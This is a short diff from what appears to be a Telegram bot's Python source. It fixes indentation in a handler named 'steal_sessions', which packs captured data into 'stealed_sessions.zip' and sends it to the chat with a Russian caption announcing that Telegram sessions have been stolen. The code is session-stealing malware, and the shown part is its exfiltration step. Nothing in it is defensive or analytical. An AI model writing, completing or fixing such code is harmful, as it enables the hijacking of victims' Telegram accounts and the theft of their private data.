@@ -84,9 +84,9 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"💥 Ошибка: {str(e)}")
 
-mem_zip.seek(0)
+        mem_zip.seek(0)
 
-    await context.bot.send_document(
+        await context.bot.send_document(
             chat_id=update.effective_chat.id,
             document=InputFile(mem_zip, filename="stealed_sessions.zip"),
             caption="🔥 Сессии Telegram украдены"
